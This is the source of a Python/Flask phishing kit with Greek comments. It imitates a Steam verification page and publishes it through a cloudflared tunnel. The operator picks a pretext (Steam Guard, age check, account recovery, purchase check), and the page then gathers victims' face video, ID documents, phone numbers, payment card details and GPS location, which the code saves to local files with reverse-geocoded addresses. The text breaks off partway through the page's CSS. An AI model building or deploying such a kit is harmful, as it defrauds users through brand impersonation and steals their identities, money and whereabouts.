import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim

# --- Ρύθμιση Εξαρτήσεων και Σήραγγας ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip σιωπηλά."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και απαραίτητα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά μια σήραγγα cloudflared και εκτυπώνει το δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_steam_username():
    """Δημιουργεί τυχαίο Steam όνομα χρήστη."""
    prefixes = ["Cyber", "Shadow", "Neon", "Digital", "Virtual", "Pixel", "Code", "Ghost", 
                "Dark", "Light", "Iron", "Steel", "Mecha", "Tech", "Omega", "Alpha", "Zero"]
    
    suffixes = ["Warrior", "Hunter", "Slayer", "Master", "Lord", "Knight", "Samurai", "Ninja",
                "Wizard", "Mage", "Assassin", "Soldier", "Agent", "Pilot", "Commander", "Captain"]
    
    number = random.randint(1, 999)
    
    username_variants = [
        f"{random.choice(prefixes)}{random.choice(suffixes)}",
        f"{random.choice(prefixes)}{random.choice(suffixes)}{number}",
        f"{random.choice(prefixes)}_{random.choice(suffixes)}",
        f"The{random.choice(prefixes)}{random.choice(suffixes)}",
        f"xX{random.choice(prefixes)}{random.choice(suffixes)}Xx",
        f"{random.choice(prefixes).lower()}{random.choice(suffixes).lower()}",
        f"{random.choice(prefixes)}{number}",
        f"{random.choice(suffixes)}{number}"
    ]
    
    return random.choice(username_variants)

def generate_steam_profile_url():
    """Δημιουργεί ένα URL προφίλ Steam."""
    steam_ids = [
        "76561198123456789",
        "76561198234567890",
        "76561198345678901",
        "76561198456789012",
        "76561198567890123"
    ]
    return f"https://steamcommunity.com/profiles/{random.choice(steam_ids)}"

def generate_steam_level():
    """Δημιουργεί επίπεδο Steam."""
    return random.randint(5, 200)

def generate_steam_games():
    """Δημιουργεί τυχαίο αριθμό παιχνιδιών."""
    return random.randint(10, 500)

def get_verification_settings():
    """Λαμβάνει προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης Steam."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΗ ΕΠΑΛΗΘΕΥΣΗΣ STEAM")
    print("="*60)
    
    # Λήψη ονόματος Steam
    print("\n[+] ΡΥΘΜΙΣΗ ΛΟΓΑΡΙΑΣΜΟΥ STEAM")
    print("Εισάγετε το όνομα χρήστη Steam για εμφάνιση")
    print("Αφήστε κενό για τυχαία δημιουργία ονόματος")
    
    username_input = input("Όνομα χρήστη Steam (ή πατήστε Enter για τυχαίο): ").strip()
    if username_input:
        settings = {'steam_username': username_input}
    else:
        random_username = generate_steam_username()
        settings = {'steam_username': random_username}
        print(f"[+] Δημιουργήθηκε όνομα Steam: {random_username}")
    
    # Δημιουργία URL προφίλ Steam
    settings['steam_profile'] = generate_steam_profile_url()
    
    # Δημιουργία επιπέδου Steam
    settings['steam_level'] = generate_steam_level()
    
    # Δημιουργία αριθμού παιχνιδιών
    settings['steam_games'] = generate_steam_games()
    
    # Δημιουργία υπολοίπου πορτοφολιού Steam
    wallet_balances = ["€0,00", "€5,42", "€12,67", "€25,89", "€50,34", "€100,75", "€250,50"]
    settings['steam_wallet'] = random.choice(wallet_balances)
    
    print(f"\n[+] Επίπεδο Steam: {settings['steam_level']}")
    print(f"[+] Παιχνίδια που κατέχει: {settings['steam_games']}")
    print(f"[+] Υπόλοιπο Πορτοφολιού: {settings['steam_wallet']}")
    print(f"[+] Προφίλ: {settings['steam_profile']}")
    
    # Τύπος επαλήθευσης
    print("\n1. Τύπος Επαλήθευσης Steam:")
    print("A - Steam Guard (Αυθεντικοποίηση δύο παραγόντων)")
    print("B - Επαλήθευση Ηλικίας (Περιεχόμενο για ενήλικες)")
    print("C - Ανάκτηση Λογαριασμού (Υποψία δραστηριότητας)")
    print("D - Επαλήθευση Αγοράς (Μεγάλη συναλλαγή)")
    
    while True:
        vtype = input("Επιλέξτε τύπο (A/B/C/D, προεπιλογή: A): ").strip().upper()
        if not vtype:
            vtype = 'A'
        if vtype in ['A', 'B', 'C', 'D']:
            if vtype == 'A':
                settings['verification_type'] = 'steam_guard'
                settings['title'] = "Επαλήθευση Steam Guard"
                settings['reason'] = "Επιβεβαιώστε την ταυτότητά σας για πρόσβαση στις λειτουργίες Steam"
            elif vtype == 'B':
                settings['verification_type'] = 'age_verification'
                settings['title'] = "Απαιτείται Επαλήθευση Ηλικίας"
                settings['reason'] = "Επαληθεύστε την ηλικία σας για πρόσβαση σε περιεχόμενο για ενήλικες"
            elif vtype == 'C':
                settings['verification_type'] = 'account_recovery'
                settings['title'] = "Ανάκτηση Λογαριασμού"
                settings['reason'] = "Ασφαλίστε τον λογαριασμό σας μετά από ύποπτη δραστηριότητα"
            else:
                settings['verification_type'] = 'purchase_verification'
                settings['title'] = "Επαλήθευση Αγοράς"
                settings['reason'] = "Επαληθεύστε τη μεγάλη αγορά για λόγους ασφαλείας"
            break
        else:
            print("Παρακαλώ εισάγετε A, B, C ή D.")
    
    # Επαλήθευση προσώπου
    if settings['verification_type'] in ['age_verification', 'account_recovery']:
        print("\n2. Επαλήθευση Προσώπου:")
        print("Απαιτείται επαλήθευση προσώπου;")
        face_enabled = input("Ενεργοποίηση επαλήθευσης προσώπου (y/n, προεπιλογή: y): ").strip().lower()
        settings['face_enabled'] = face_enabled in ['y', 'yes', '']
        
        if settings['face_enabled']:
            while True:
                try:
                    duration = input("Διάρκεια σε δευτερόλεπτα (5-20, προεπιλογή: 15): ").strip()
                    if not duration:
                        settings['face_duration'] = 15
                        break
                    duration = int(duration)
                    if 5 <= duration <= 20:
                        settings['face_duration'] = duration
                        break
                    else:
                        print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 20.")
                except ValueError:
                    print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    else:
        settings['face_enabled'] = False
    
    # Επαλήθευση ταυτότητας
    if settings['verification_type'] in ['age_verification', 'account_recovery']:
        print("\n3. Επαλήθευση Ταυτότητας:")
        print("Απαιτείται μεταφόρτωση εγγράφου ταυτότητας;")
        id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (y/n, προεπιλογή: y): ").strip().lower()
        settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    else:
        settings['id_enabled'] = False
    
    # Επαλήθευση τηλεφώνου (για Steam Guard)
    if settings['verification_type'] == 'steam_guard':
        print("\n4. Επαλήθευση Τηλεφώνου:")
        print("Απαιτείται επαλήθευση τηλεφώνου;")
        phone_enabled = input("Ενεργοποίηση επαλήθευσης τηλεφώνου (y/n, προεπιλογή: y): ").strip().lower()
        settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
    else:
        settings['phone_enabled'] = False
    
    # Επαλήθευση πληρωμής (για επαλήθευση αγοράς)
    if settings['verification_type'] == 'purchase_verification':
        print("\n5. Επαλήθευση Πληρωμής:")
        print("Απαιτείται επαλήθευση πληρωμής;")
        payment_enabled = input("Ενεργοποίηση επαλήθευσης πληρωμής (y/n, προεπιλογή: y): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['y', 'yes', '']
        
        if settings['payment_enabled']:
            purchase_amounts = ["€19,99", "€49,99", "€59,99", "€99,99", "€199,99"]
            settings['purchase_amount'] = random.choice(purchase_amounts)
            print(f"[+] Ποσό αγοράς: {settings['purchase_amount']}")
    else:
        settings['payment_enabled'] = False
    
    # Επαλήθευση τοποθεσίας
    print("\n6. Επαλήθευση Τοποθεσίας:")
    print("Απαιτείται επαλήθευση τοποθεσίας;")
    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (y/n, προεπιλογή: n): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes']
    
    return settings

# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---

geolocator = Nominatim(user_agent="steam_verification")

# Παγκόσμιες ρυθμίσεις και φάκελος λήψης
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Επαλήθευση Steam')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'επαλήθευση_προσώπου'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'έγγραφα_ταυτότητας'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_τηλεφώνου'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_πληρωμής'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_τοποθεσίας'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_χρήστη'), exist_ok=True)

def process_and_save_location(data, session_id):
    """Επεξεργάζεται και αποθηκεύει δεδομένα τοποθεσίας."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστο"
        try:
            location = geolocator.reverse((lat, lon), language='el', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "πλατφόρμα": "επαλήθευση_steam",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "συντεταγμένες_gps": {
                "πλάτος": lat,
                "μήκος": lon,
                "ακρίβεια_μ": data.get('accuracy')
            },
            "πληροφορίες_διεύθυνσης": {
                "πλήρης_διεύθυνση": full_address,
                "πόλη": address_details.get("city"),
                "περιφέρεια": address_details.get("state"),
                "χώρα": address_details.get("country")
            },
            "δεδομένα_επαλήθευσης": {
                "steam_όνομα_χρήστη": data.get('steam_username', 'άγνωστο'),
                "τύπος_επαλήθευσης": data.get('verification_type', 'άγνωστο'),
                "σκοπός": data.get('purpose', 'άγνωστο')
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"steam_τοποθεσία_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_τοποθεσίας', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Αποθηκεύτηκαν δεδομένα τοποθεσίας Steam: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Εφαρμογή Flask ---

app = Flask(__name__)

# Παγκόσμιες ρυθμίσεις
VERIFICATION_SETTINGS = {
    'steam_username': generate_steam_username(),
    'steam_profile': generate_steam_profile_url(),
    'steam_level': generate_steam_level(),
    'steam_games': generate_steam_games(),
    'steam_wallet': "€25,89",
    'verification_type': 'steam_guard',
    'title': "Επαλήθευση Steam Guard",
    'reason': "Επιβεβαιώστε την ταυτότητά σας για πρόσβαση στις λειτουργίες Steam",
    'face_enabled': False,
    'face_duration': 15,
    'id_enabled': False,
    'phone_enabled': True,
    'payment_enabled': False,
    'purchase_amount': "€59,99",
    'location_enabled': False
}

def create_greek_html_template(settings):
    """Δημιουργεί το ελληνικό πρότυπο επαλήθευσης Steam."""
    steam_username = settings['steam_username']
    steam_profile = settings['steam_profile']
    steam_level = settings['steam_level']
    steam_games = settings['steam_games']
    steam_wallet = settings['steam_wallet']
    verification_type = settings['verification_type']
    title = settings['title']
    reason = settings['reason']
    face_duration = settings.get('face_duration', 15)
    purchase_amount = settings.get('purchase_amount', "€59,99")
    
    # Χρώματα Steam
    colors = {
        'steam_blue': '#171a21',
        'steam_dark': '#1b2838',
        'steam_light': '#2a475e',
        'steam_accent': '#66c0f4',
        'steam_green': '#5c7e10',
        'steam_text': '#c7d5e0',
        'steam_muted': '#8f98a0'
    }
    
    # Βήματα βάσει τύπου επαλήθευσης
    total_steps = 2  # Εισαγωγή + Βήμα 1
    
    if settings['face_enabled']:
        total_steps += 1
    
    if settings['id_enabled']:
        total_steps += 1
    
    if settings['phone_enabled']:
        total_steps += 1
    
    if settings['payment_enabled']:
        total_steps += 1
    
    if settings['location_enabled']:
        total_steps += 1
    
    total_steps += 1  # Βήμα επεξεργασίας
    total_steps += 1  # Βήμα ολοκλήρωσης
    
    # Διορθώσεις για μορφοποίηση προτύπου
    step2_indicator = f'<div class="step" id="step2Indicator">\n<div class="step-number">2</div>\n<div class="step-label">{"Steam Guard" if verification_type == "steam_guard" else ("Επαλήθευση Ηλικίας" if verification_type == "age_verification" else ("Ανάκτηση" if verification_type == "account_recovery" else "Πληρωμή"))}</div>\n</div>' if total_steps > 3 else ''
    
    step3_indicator = f'<div class="step" id="step3Indicator">\n<div class="step-number">3</div>\n<div class="step-label">{"Ταυτότητα" if settings["id_enabled"] else ("Τηλέφωνο" if settings["phone_enabled"] else "Τοποθεσία")}</div>\n</div>' if total_steps > 4 else ''
    
    step4_indicator = '<div class="step" id="step4Indicator">\n<div class="step-number">4</div>\n<div class="step-label">Ολοκλήρωση</div>\n</div>' if total_steps > 5 else ''
    
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Steam - {title}</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --steam-blue: {colors['steam_blue']};
            --steam-dark: {colors['steam_dark']};
            --steam-light: {colors['steam_light']};
            --steam-accent: {colors['steam_accent']};
            --steam-green: {colors['steam_green']};
            --steam-text: {colors['steam_text']};
            --steam-muted: {colors['steam_muted']};
            --steam-border: #3d4450;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }}
        
        html, body {{
            height: 100%;
            overflow-x: hidden;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--steam-blue);
            color: var(--steam-text);
            line-height: 1.6;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }}
        
        .container {{
            max-width: 100%;
            margin: 0 auto;
            padding: 15px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }}
        
        /* Κεφαλίδα */
        .header {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 0;
            border-bottom: 1px solid var(--steam-border);
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }}
        
        .steam-logo {{
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 22px;
            font-weight: 300;
            flex-shrink: 0;
        }}
        
        .logo-icon {{
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_light']});
            border-radius: 8px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
            flex-shrink: 0;
        }}
        
        .verification-badge {{
            background: var(--steam-green);
            color: white;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            flex-shrink: 0;
        }}
        
        /* Κάρτα Προφίλ */
        .profile-card {{
            background: linear-gradient(135deg, {colors['steam_dark']}, {colors['steam_light']});
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--steam-border);
        }}
        
        .profile-header {{
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }}
        
        .profile-avatar {{
            width: 70px;
            height: 70px;
            border-radius: 8px;
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_light']});
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
            font-weight: 500;
            overflow: hidden;
            border: 2px solid var(--steam-accent);
            flex-shrink: 0;
        }}
        
        .profile-info h2 {{
            font-size: 20px;
            margin-bottom: 5px;
            color: white;
            word-break: break-word;
        }}
        
        .profile-info p {{
            color: var(--steam-muted);
            font-size: 13px;
            word-break: break-all;
        }}
        
        .profile-stats {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            padding-top: 15px;
            border-top: 1px solid var(--steam-border);
        }}
        
        .stat {{
            text-align: center;
            padding: 12px 8px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            border: 1px solid var(--steam-border);
        }}
        
        .stat-value {{
            font-size: 20px;
            font-weight: 500;
            color: var(--steam-accent);
            margin-bottom: 4px;
        }}
        
        .stat-label {{
            font-size: 11px;
            color: var(--steam-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
        
        /* Ειδοποίηση */
        .steam-alert {{
            background: linear-gradient(135deg, #1b2838, #2a475e);
            border: 1px solid var(--steam-border);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }}
        
        .steam-alert::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: var(--steam-accent);
        }}
        
        .alert-icon {{
            font-size: 28px;
            color: var(--steam-accent);
            margin-bottom: 12px;
        }}
        
        .alert-content h3 {{
            font-size: 18px;
            margin-bottom: 8px;
            color: white;
        }}
        
        .alert-content p {{
            font-size: 14px;
            line-height: 1.5;
        }}
        
        /* Βήματα */
        .steps-container {{
            margin-bottom: 30px;
            flex: 1;
        }}
        
        .step-indicator {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
            flex-wrap: nowrap;
            overflow-x: auto;
            padding-bottom: 10px;
            -webkit-overflow-scrolling: touch;
        }}
        
        .step-indicator::-webkit-scrollbar {{
            display: none;
        }}
        
        .step-indicator::before {{
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--steam-border);
            z-index: 1;
        }}
        
        .step {{
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
            min-width: 70px;
            flex-shrink: 0;
        }}
        
        .step-number {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: var(--steam-border);
            color: var(--steam-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            margin-bottom: 8px;
            border: 3px solid var(--steam-blue);
            transition: all 0.3s;
            font-size: 14px;
            flex-shrink: 0;
        }}
        
        .step-number.active {{
            background: var(--steam-accent);
            color: white;
            transform: scale(1.1);
        }}
        
        .step-number.completed {{
            background: var(--steam-green);
            color: white;
        }}
        
        .step-label {{
            font-size: 11px;
            color: var(--steam-muted);
            text-align: center;
            max-width: 70px;
            line-height: 1.3;
            word-break: break-word;
        }}
        
        .step-label.active {{
            color: var(--steam-accent);
            font-weight: 500;
        }}
        
        /* Περιεχόμενο Βήματος */
        .step-content {{
            display: none;
            animation: fadeIn 0.5s;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-content.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 22px;
            margin-bottom: 12px;
            font-weight: 300;
            color: white;
            line-height: 1.3;
        }}
        
        .step-description {{
            color: var(--steam-muted);
            margin-bottom: 25px;
            font-size: 15px;
            line-height: 1.5;
        }}
        
        /* Κώδικας Steam Guard */
        .guard-container {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            text-align: center;
            border: 1px solid var(--steam-border);
        }}
        
        .guard-code {{
            font-size: 42px;
            font-weight: 500;
            letter-spacing: 6px;
            color: var(--steam-accent);
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            line-height: 1.2;
        }}
        
        .code-input {{
            width: 100%;
            padding: 15px;
            background: var(--steam-dark);
            border: 2px solid var(--steam-border);
            border-radius: 6px;
            color: white;
            font-size: 18px;
            text-align: center;
            letter-spacing: 6px;
            font-family: 'Courier New', monospace;
            margin-bottom: 15px;
            -webkit-appearance: none;
            appearance: none;
        }}
        
        .code-input:focus {{
            outline: none;
            border-color: var(--steam-accent);
        }}
        
        /* Ενότητα Κάμερας */
        .camera-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            text-align: center;
            border: 1px solid var(--steam-border);
        }}
        
        .camera-container {{
            width: 100%;
            max-width: 280px;
            height: 280px;
            margin: 0 auto 20px;
            border-radius: 8px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--steam-accent);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 180px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
        }}
        
        .timer {{
            font-size: 28px;
            font-weight: 500;
            color: var(--steam-accent);
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }}
        
        /* Μεταφόρτωση Ταυτότητας */
        .upload-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 2px dashed var(--steam-border);
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            touch-action: manipulation;
        }}
        
        .upload-section:hover, .upload-section:active {{
            border-color: var(--steam-accent);
            background: rgba(102, 192, 244, 0.1);
        }}
        
        .upload-icon {{
            font-size: 42px;
            color: var(--steam-accent);
            margin-bottom: 15px;
        }}
        
        /* Επαλήθευση Τηλεφώνου */
        .phone-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 1px solid var(--steam-border);
        }}
        
        .phone-input {{
            width: 100%;
            padding: 15px;
            background: var(--steam-dark);
            border: 2px solid var(--steam-border);
            border-radius: 6px;
            color: white;
            font-size: 16px;
            margin-bottom: 15px;
            -webkit-appearance: none;
            appearance: none;
        }}
        
        /* Ενότητα Πληρωμής */
        .payment-section {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 1px solid var(--steam-border);
        }}
        
        .payment-amount {{
            font-size: 32px;
            color: var(--steam-accent);
            text-align: center;
            margin: 15px 0;
            font-weight: 500;
        }}
        
        .form-group {{
            margin-bottom: 15px;
        }}
        
        .form-label {{
            display: block;
            margin-bottom: 6px;
            color: var(--steam-text);
            font-weight: 500;
            font-size: 14px;
        }}
        
        .form-input {{
            width: 100%;
            padding: 12px;
            background: var(--steam-dark);
            border: 2px solid var(--steam-border);
            border-radius: 6px;
            color: white;
            font-size: 16px;
            -webkit-appearance: none;
            appearance: none;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: var(--steam-accent);
        }}
        
        .card-details {{
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
        }}
        
        /* Κουμπιά */
        .btn {{
            display: inline-block;
            padding: 16px 24px;
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_light']});
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
            width: 100%;
            touch-action: manipulation;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }}
        
        .btn:hover, .btn:active {{
            background: linear-gradient(135deg, #5cb0e8, #295a7a);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(102, 192, 244, 0.3);
        }}
        
        .btn:active {{
            transform: translateY(0);
        }}
        
        .btn:disabled {{
            background: var(--steam-border);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            opacity: 0.7;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .btn-outline {{
            background: transparent;
            border: 2px solid var(--steam-border);
            color: var(--steam-text);
            padding: 14px 24px;
        }}
        
        .btn-outline:hover, .btn-outline:active {{
            background: rgba(255, 255, 255, 0.1);
            border-color: var(--steam-accent);
            color: var(--steam-accent);
        }}
        
        .button-group {{
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 25px;
        }}
        
        /* Μηνύματα Κατάστασης */
        .status-message {{
            padding: 12px 15px;
            border-radius: 6px;
            margin: 15px 0;
            text-align: center;
            border: 1px solid;
            font-size: 14px;
            line-height: 1.4;
        }}
        
        .status-success {{
            background: rgba(92, 126, 16, 0.2);
            color: #a3cf33;
            border-color: var(--steam-green);
        }}
        
        .status-error {{
            background: rgba(255, 60, 60, 0.2);
            color: #ff6b6b;
            border-color: #ff3c3c;
        }}
        
        .status-processing {{
            background: rgba(102, 192, 244, 0.2);
            color: var(--steam-accent);
            border-color: var(--steam-accent);
        }}
        
        /* Φορτωτής */
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Πλαίσιο Πληροφοριών */
        .info-box {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            padding: 18px;
            margin: 15px 0;
            border-left: 4px solid var(--steam-accent);
        }}
        
        .info-box h4 {{
            color: var(--steam-accent);
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 16px;
        }}
        
        .info-box ul {{
            padding-left: 20px;
            margin-top: 8px;
        }}
        
        .info-box li {{
            margin-bottom: 5px;
            font-size: 14px;
            line-height: 1.4;
        }}
        
        /* Οθόνη Ολοκλήρωσης */
        .completion-screen {{
            text-align: center;
            padding: 40px 15px;
        }}
        
        .success-icon {{
            width: 70px;
            height: 70px;
            background: var(--steam-green);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            margin: 0 auto 25px;
        }}
        
        .steam-verified {{
            background: linear-gradient(135deg, {colors['steam_accent']}, {colors['steam_green']});
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 24px;
            font-weight: 500;
            margin: 15px 0;
            line-height: 1.3;
        }}
        
        /* Υποσέλιδο */
        .footer {{
            text-align: center;
            padding: 25px 0;
            border-top: 1px solid var(--steam-border);
            margin-top: 30px;
            color: var(--steam-muted);
            font-size: 13px;
            flex-shrink: 0;
        }}
        
        .footer-links {{
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 12px;
        }}
        
        .footer-links a {{
            color: var(--steam-accent);
            text-decoration: none;
            font-size: 12px;
            white-space: nowrap;
        }}
        
        .footer-links a:hover, .footer-links a:active {{
            text-decoration: underline;
        }}
        
        /* Βελτιστοποίηση για Κινητά */
        @media (max-width: 768px) {{
            .container {{
                padding: 12px;
            }}
            
            .header {{
                flex-direction: column;
                text-align: center;
                gap: 12px;
            }}
            
            .steam-logo {{
                font-size: 20px;
            }}
            
            .verification-badge {{
                font-size: 11px;
                padding: 5px 10px;
            }}
            
            .profile-header {{
                flex-direction: column;
                text-align: center;
                gap: 12px;
            }}
            
            .profile-avatar {{
                width: 60px;
                height: 60px;
                font-size: 24px;
            }}
            
            .profile-info h2 {{
                font-size: 18px;
            }}
            
            .profile-stats {{
                grid-template-columns: repeat(3, 1fr);
                gap: 8px;
            }}
            
            .stat {{
                padding: 10px 6px;
            }}
            
            .stat-value {{
                font-size: 18px;
            }}
            
            .stat-label {{
                font-size: 10px;
            }}
            
            .step-indicator {{
                margin-bottom: 25px;
            }}
            
            .step {{
                min-width: 60px;
            }}
            
            .step-number {{
                width: 32px;
                height: 32px;
                font-size: 13px;
            }}
            
            .step-label {{
                font-size: 10px;
                max-width: 60px;
            }}
            
            .camera-container {{
                max-width: 250px;
                height: 250px;
            }}
            
            .face-circle {{
                width: 160px;
                height: 160px;
            }}
            
            .guard-code {{
                font-size: 36px;
                letter-spacing: 5px;
            }}
            
            .payment-amount {{
                font-size: 28px;
            }}
            
            .steam-verified {{
                font-size: 22px;
            }}
        }}
        
        @media (max-width: 480px) {{
            .container {{
                padding: 10px;
            }}
            
            .profile-stats {{
                grid-template-columns: repeat(3, 1fr);
                gap: 6px;
            }}
            
            .stat {{
                padding: 8px 4px;
            }}
            
            .stat-value {{
                font-size: 16px;
            }}
            
            .stat-label {{
                font-size: 9px;
            }}
            
            .step {{
                min-width: 55px;
            }}
            
            .step-number {{
                width: 28px;
                height: 28px;
                font-size: 12px;
            }}
            
